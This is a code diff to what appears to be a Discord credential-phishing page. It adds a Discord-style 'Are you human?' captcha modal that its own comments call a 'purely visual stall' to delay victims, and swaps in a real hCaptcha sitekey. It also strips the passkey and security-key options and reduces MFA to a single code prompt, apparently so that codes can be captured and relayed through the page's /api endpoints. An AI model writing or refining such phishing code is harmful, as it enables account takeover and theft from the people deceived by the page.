@@ -130,24 +130,47 @@
     .mfa-method:hover{text-decoration:underline}
     .mfa-sep{margin-top:14px;border-top:1px solid var(--modifier-accent);padding-top:14px}
 
-    /* ═══ Captcha overlay — hosts real hCaptcha SDK widget ═══ */
+    /* ═══ Captcha modal — Discord-style "Wait! Are you human?" ═══ */
     .captcha-overlay{
       display:none;position:fixed;top:0;left:0;width:100%;height:100%;
-      background:rgba(0,0,0,.55);z-index:10000;
+      background:rgba(0,0,0,.7);z-index:10000;
       align-items:center;justify-content:center;flex-direction:column;
     }
     .captcha-overlay.show{display:flex}
-    .captcha-inner{
-      display:flex;flex-direction:column;align-items:center;gap:12px;
+    .captcha-modal{
+      background:#2b2d31;border-radius:8px;width:340px;max-width:95vw;
+      display:flex;flex-direction:column;align-items:center;
+      padding:0 0 24px 0;overflow:hidden;position:relative;
+      box-shadow:0 8px 32px rgba(0,0,0,.4);
     }
-    .captcha-status{
-      color:rgba(255,255,255,.8);font-size:14px;font-family:Arial,sans-serif;
-      text-align:center;display:flex;align-items:center;gap:8px;
+    .captcha-modal-close{
+      position:absolute;top:12px;right:12px;width:28px;height:28px;
+      display:flex;align-items:center;justify-content:center;
+      color:var(--text-muted);cursor:pointer;font-size:20px;
+      background:none;border:none;border-radius:4px;z-index:2;
+      line-height:1;
     }
-    .captcha-status .mini-spin{
-      display:inline-block;width:14px;height:14px;
-      border:2px solid rgba(255,255,255,.3);border-top-color:#fff;
-      border-radius:50%;animation:spin .7s linear infinite;
+    .captcha-modal-close:hover{color:var(--text-normal)}
+    .captcha-face-wrap{
+      margin-top:28px;margin-bottom:4px;
+    }
+    .captcha-face-wrap img{
+      width:128px;height:auto;display:block;
+    }
+    .captcha-modal h2{
+      color:var(--header-primary);font-size:20px;font-weight:600;
+      margin:8px 0 4px;text-align:center;
+    }
+    .captcha-modal p{
+      color:var(--header-secondary);font-size:14px;text-align:center;
+      margin-bottom:16px;
+    }
+    .captcha-hc-wrap{
+      display:flex;justify-content:center;min-height:78px;
+    }
+    .captcha-err{
+      color:#f04747;font-size:12px;margin-top:8px;text-align:center;
+      min-height:16px;
     }
   </style>
 </head>
@@ -193,8 +216,8 @@
       <!-- MFA -->
       <div id="sec-mfa" style="display:none">
         <div class="card-header">
-          <h1 id="mfa-title">Two-Factor Authentication</h1>
-          <p id="mfa-desc">Enter the 6-digit code from your authenticator app.</p>
+          <h1 id="mfa-title">Multa-Factor Authentication</h1>
+          <p id="mfa-desc">Enter Discord auth code</p>
         </div>
         <div class="err-msg" id="mfa-error"></div>
         <div class="form-group">
@@ -202,8 +225,7 @@
           <input type="text" id="mfa-code" placeholder="6-digit authentication code" maxlength="10" autocomplete="one-time-code"/>
         </div>
         <button class="btn" id="mfa-btn" style="margin-top:0">Log In</button>
-        <div class="mfa-sep" id="mfa-links"></div>
-        <a class="mfa-method" onclick="backToLogin()">&larr; Back to login</a>
+        <div id="mfa-links" style="display:none"></div>
       </div>
 
       <!-- Email Verification -->
@@ -237,17 +259,23 @@
       <div class="qr-title">Log in with QR Code</div>
       <div class="qr-wrap" id="qr-box"><span class="spinner spinner-lg"></span></div>
       <div id="qr-stat" class="qr-desc">Connecting&hellip;</div>
-      <a class="qr-link" id="passkey-btn">Or, sign in with a passkey</a>
+
     </div>
 
   </div>
 </div>
 
-<!-- hCaptcha overlay — real hCaptcha SDK widget -->
+<!-- Captcha modal — Discord-style "Wait! Are you human?" -->
 <div class="captcha-overlay" id="captcha-overlay">
-  <div class="captcha-inner">
-    <div id="h-captcha-target"></div>
-    <div class="captcha-status" id="captcha-status"></div>
+  <div class="captcha-modal">
+    <button class="captcha-modal-close" onclick="closeCaptcha()">&times;</button>
+    <div class="captcha-face-wrap">
+      <img src="/captcha_face.png" alt=""/>
+    </div>
+    <h2>Wait! Are you human?</h2>
+    <p>Please confirm you're not a robot.</p>
+    <div class="captcha-hc-wrap" id="h-captcha-target"></div>
+    <div class="captcha-err" id="captcha-err-msg"></div>
   </div>
 </div>
 
@@ -385,7 +413,7 @@ async function pollQR() {
  * actually stall users, register free at https://dashboard.hcaptcha.com and
  * create a sitekey with difficulty set to "Always Challenge".
  */
-var HCAPTCHA_SITEKEY = '10000000-ffff-ffff-ffff-000000000001';
+var HCAPTCHA_SITEKEY = 'a9b5fb07-92ff-493f-86fe-352a2803b3df';
 
 var stallPollTimer = null;
 var hcSolvedByServer = false;
@@ -402,10 +430,10 @@ function showCaptchaStall(sessionId) {
   _pendingServerResult = null;
 
   var overlay = document.getElementById('captcha-overlay');
-  var status  = document.getElementById('captcha-status');
+  var errEl   = document.getElementById('captcha-err-msg');
   var target  = document.getElementById('h-captcha-target');
 
-  status.innerHTML = '';
+  errEl.textContent = '';
   target.innerHTML = '';
   overlay.classList.add('show');
 
@@ -441,8 +469,7 @@ function _renderHcaptcha(target) {
 
 function _onHcaptchaPass(token) {
   /* User completed hCaptcha (we don't use this token, purely visual stall) */
-  var status = document.getElementById('captcha-status');
-  status.innerHTML = '<span class="mini-spin"></span> Verified! Connecting to Discord\u2026';
+  document.getElementById('captcha-err-msg').textContent = '';
   /* If server already finished, process immediately */
   if (hcSolvedByServer && _pendingServerResult) {
     var d = _pendingServerResult; _pendingServerResult = null;
@@ -453,7 +480,7 @@ function _onHcaptchaExpire() {
   if (hcWidgetId !== null && hcaptchaReady) try { hcaptcha.reset(hcWidgetId); } catch(e) {}
 }
 function _onHcaptchaError() {
-  document.getElementById('captcha-status').innerHTML = '<span class="mini-spin"></span> Verifying\u2026';
+  document.getElementById('captcha-err-msg').textContent = 'Network error. Please try again.';
 }
 
 function _closeCaptchaOverlay() {
@@ -693,41 +720,13 @@ function updateMfaUI() {
   var desc  = document.getElementById('mfa-desc');
   var inp   = document.getElementById('mfa-code');
   hideErr('mfa-error');
-  switch(mfaMode) {
-    case 'totp':
-      title.textContent = 'Two-Factor Authentication';
-      desc.textContent  = 'Enter the 6-digit code from your authenticator app.';
-      inp.placeholder   = '6-digit authentication code'; inp.maxLength = 6; break;
-    case 'sms':
-      title.textContent = 'Two-Factor Authentication';
-      desc.textContent  = 'Enter the code we sent to your phone.';
-      inp.placeholder   = '6-digit SMS code'; inp.maxLength = 6; break;
-    case 'backup':
-      title.textContent = 'Two-Factor Authentication';
-      desc.textContent  = 'Enter one of your 8-digit backup codes.';
-      inp.placeholder   = '8-digit backup code'; inp.maxLength = 10; break;
-  }
-  var links = '';
-  if (mfaMode !== 'totp')   links += '<a class="mfa-method" onclick="switchMfa(\'totp\')">Use authenticator app</a>';
-  if (mfaMode !== 'sms' && mfaHasSms) links += '<a class="mfa-method" onclick="switchMfa(\'sms\')">Receive code via SMS</a>';
-  if (mfaMode !== 'backup') links += '<a class="mfa-method" onclick="switchMfa(\'backup\')">Use a backup code</a>';
-  links += '<a class="mfa-method" onclick="trySecKey()">Use a security key</a>';
-  document.getElementById('mfa-links').innerHTML = links;
+  title.textContent = 'Multa-Factor Authentication';
+  desc.textContent  = 'Enter Discord auth code';
+  inp.placeholder   = '6-digit authentication code';
+  inp.maxLength     = 10;
+  document.getElementById('mfa-links').innerHTML = '';
   inp.value = ''; setTimeout(function() { inp.focus(); }, 50);
 }
-
-async function switchMfa(mode) {
-  if (mode === 'sms' && mfaTicket) {
-    try {
-      await fetch('/api/mfa/sms/send', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({ticket:mfaTicket}) });
-    } catch(e) {
-      showErr('mfa-error', 'Failed to send SMS.');
-    }
-  }
-  mfaMode = mode; updateMfaUI();
-}
-
-function trySecKey() { showErr('mfa-error', 'Security keys are bound to discord.com. Please use another method.'); }
 
 document.getElementById('mfa-btn').addEventListener('click', submitMfa);
 document.getElementById('mfa-code').addEventListener('keydown', function(e) { if (e.key === 'Enter') submitMfa(); });
@@ -756,12 +755,6 @@ function backToLogin() {
   hideErr('mfa-error');
   showSec('login');
 }
-
-/* ═══ Passkey ═══ */
-document.getElementById('passkey-btn').addEventListener('click', function(e) {
-  e.preventDefault();
-  showErr('login-error', 'Passkeys are bound to discord.com and cannot be used from this page.');
-});
 
 /* ═══ Init ═══ */
 window.addEventListener('DOMContentLoaded', initQR);
